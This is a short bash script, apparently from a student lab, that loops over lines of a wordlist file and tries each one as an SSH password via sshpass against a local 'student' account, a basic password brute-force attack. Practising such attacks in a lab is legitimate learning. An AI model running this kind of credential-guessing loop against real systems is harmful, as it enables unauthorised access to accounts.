#!/bin/bash

for line in $(cat ~/Apollo-13/cain.txt)

do
echo "$line"

sshpass -p $line ssh studentlocalhost


done






